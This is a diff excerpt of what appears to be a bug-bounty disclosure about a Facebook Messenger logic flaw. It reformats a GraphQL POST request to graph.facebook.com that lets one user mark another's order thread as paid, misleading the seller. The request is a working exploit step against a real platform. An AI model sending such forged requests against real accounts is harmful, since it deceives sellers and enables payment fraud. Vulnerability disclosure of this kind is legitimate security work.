@@ -27,20 +27,11 @@ The result misleads the seller (UI shows the order as *Paid* and hides the Mark 
 5. Using the **Graph API Explorer** (or any HTTP client), **UserB** sends a **POST** to GraphQL with the following parameters:
 
 ### 📤 Request (Original)
-```http
-POST v10.0/graphql
+```
+POST https://graph.facebook.com/graphql
 
 doc_id=5583150721696906
-variables={
-  "input": {
-    "client_mutation_id": "1",
-    "actor_id": "1",
-    "is_mark_as_paid": true,
-    "message_thread_id": "{ID_MESSAGE}",
-    "should_update_thread_label": false,
-    "surface": "MESSENGER_LIGHTSPEED_BANNER"
-  }
-}
+variables={"input": {"client_mutation_id": "1","actor_id": "1","is_mark_as_paid": true,"message_thread_id": "{ID_MESSAGE}","should_update_thread_label": false,"surface": "MESSENGER_LIGHTSPEED_BANNER"}}
 ```
 
 ### ✅ Response
